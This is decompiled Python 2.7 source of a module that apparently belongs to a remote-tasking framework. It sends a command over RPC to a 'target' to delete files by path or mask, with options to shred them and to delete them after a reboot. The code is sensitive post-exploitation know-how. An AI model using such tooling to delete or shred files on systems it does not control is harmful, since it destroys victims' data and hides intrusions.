# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Delete_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    import mcl.tasking.virtualdir
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.file.cmd.delete', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.file.cmd.delete.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.file.cmd.delete.Params()
    tgtParams.provider = mcl.tasking.technique.Lookup('DELETE', mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, lpParams['method'])
    if lpParams['afterReboot']:
        tgtParams.flags |= mca.file.cmd.delete.PARAMS_FLAG_AFTER_REBOOT
    if lpParams['shred']:
        tgtParams.flags |= mca.file.cmd.delete.PARAMS_FLAG_SHRED
    numFileTypes = 0
    if lpParams['single_file'] != None:
        numFileTypes = numFileTypes + 1
    if lpParams['path_and_mask'] != None:
        numFileTypes = numFileTypes + 1
    if lpParams['mask'] != None or lpParams['path'] != None:
        numFileTypes = numFileTypes + 1
    if numFileTypes == 0:
        mcl.tasking.OutputError('No file(s) specified')
        return False
    else:
        if numFileTypes > 1:
            mcl.tasking.OutputError('More than one method used to specify files.  Unable to determine correct files.')
            return False
        if lpParams['single_file'] != None:
            pathAndMask = lpParams['single_file']
        else:
            pathAndMask = lpParams['path_and_mask']
        try:
            path, mask = mcl.tasking.virtualdir.GetMaskAndPath(pathAndMask, lpParams['mask'], lpParams['path'], noDefaultMask=True)
        except RuntimeError as err:
            mcl.tasking.OutputError(str(err))
            return False

        if len(mask) == 0:
            mcl.tasking.OutputError('A filename/mask must be specified')
            return False
        try:
            path = mcl.tasking.virtualdir.GetFullPath(path)
        except:
            mcl.tasking.OutputError('Failed to get full path for deletion')
            return False

        tgtParams.path = path
        tgtParams.mask = mask
        tgtParams.maxEntries = lpParams['max']
        taskXml = mcl.tasking.Tasking()
        taskXml.AddSearchMask(tgtParams.mask)
        taskXml.AddSearchPath(tgtParams.path)
        if tgtParams.maxEntries >= 0:
            taskXml.SetMaxMatches(tgtParams.maxEntries)
        taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, tgtParams.provider)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        rpc = mca.file.cmd.delete.tasking.RPC_INFO_DELETE
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.file.cmd.delete.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)